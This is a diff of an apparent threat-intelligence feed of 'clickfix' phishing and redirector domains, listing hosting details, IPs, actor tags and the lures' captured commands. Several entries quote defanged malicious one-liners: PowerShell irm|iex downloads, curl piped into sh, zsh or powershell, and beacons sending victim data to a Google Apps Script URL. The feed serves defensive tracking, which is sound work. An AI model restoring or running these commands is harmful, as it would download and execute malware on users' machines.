+   "offline_since": null,
+   "url": "https://save-money-explore-future.netlify.app/",
+   "brand": null,
+   "product": null,
+   "hosting": "Netlify",
+   "dns": null,
+   "ip": "2a05:d014:58f:6200::259",
+   "asn": "AS16509",
+   "org": "AMAZON-02 - Amazon.com, Inc., US",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2a05:d014:58f:6200::259",
+     "asn": "AS16509",
+     "org": "AMAZON-02 - Amazon.com, Inc., US",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    },
+    {
+     "ip": "35.157.26.135",
+     "asn": "AS16509",
+     "org": "AMAZON-02 - Amazon.com, Inc., US",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "save-money-explore-future.netlify.app",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/ki9ao4wpdn/[id]')|iex",
+    "curl -kfsSL $(echo '[encoded]'|base64 -D)|zsh;"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net",
+    "modalgrid.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "savemypropertynow.com",
@@ -277517,6 +278251,59 @@
    ]
   },
   {
+   "indicator": "thebackyarddetailers.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://thebackyarddetailers.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "HIVELOCITY",
+   "dns": "Cloudflare",
+   "ip": "209.133.207.90",
+   "asn": "AS29802",
+   "org": "HIVELOCITY, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "209.133.207.90",
+     "asn": "AS29802",
+     "org": "HIVELOCITY, Inc.",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "thebackyarddetailers.com",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "curl -sL -d \"id=486ab3a2-5990-4bed-bed7-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fthebackyarddetailers.com%2F&os=Mac%2015&lastVisitAt=2026-11-24T01%3A57%3A00.394Z&lastShellAt=2026-11-24T01%3A57%3A00.394Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=9152556c-4b33-4bea-9ee3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fthebackyarddetailers.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-24T01%3A50%3A22.855Z\"\" -d \"\"lastShellAt=2026-11-24T01%3A50%3A22.855Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+   ],
+   "connects_to": [
+    "softify.lat",
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "img-codes-cloude.info"
+   ]
+  },
+  {
    "indicator": "thebansalbrothers.com",
    "type": "domain",
    "category": "clickfix",
@@ -297816,7 +298603,7 @@
      "asn": "AS1836",
      "org": "GREEN green.ch AG, CH",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -297824,7 +298611,7 @@
      "host": "videoreport.ch",
      "status": "online",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -302673,6 +303460,56 @@
     "trek-72.com",
     "j7tracker.gb.net",
     "lepafonso.bz"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
+   "indicator": "wailea-club.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://www.wailea-club.com/column/20191213/",
+   "brand": null,
+   "product": null,
+   "hosting": "SAKURA Internet Inc.",
+   "dns": "d-53.jp",
+   "ip": "133.167.66.188",
+   "asn": "AS9371",
+   "org": "SAKURA-C - SAKURA Internet Inc., JP",
+   "country": "JP",
+   "ips": [
+    {
+     "ip": "133.167.66.188",
+     "asn": "AS9371",
+     "org": "SAKURA-C - SAKURA Internet Inc., JP",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.wailea-club.com",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/ben/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -315631,6 +316468,54 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
    "connects_to": [],
+   "lure_from": []
+  },
+  {
+   "indicator": "zavarovanje-osiguranje.eu",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-23",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://www.zavarovanje-osiguranje.eu/author/pija/page/18/",
+   "brand": null,
+   "product": null,
+   "hosting": "EU EDIS GmbH",
+   "dns": "spletni-prostor.si",
+   "ip": "192.36.38.206",
+   "asn": "AS57169",
+   "org": "EDIS-AS-EU EDIS GmbH, AT",
+   "country": "SE",
+   "ips": [
+    {
+     "ip": "192.36.38.206",
+     "asn": "AS57169",
+     "org": "EDIS-AS-EU EDIS GmbH, AT",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.zavarovanje-osiguranje.eu",
+     "status": "online",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'o0vexijx[.]zayce[.]store/?ublib=')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+   ],
+   "connects_to": [
+    "o0vexijx.zayce.store"
+   ],
    "lure_from": []
   },
   {
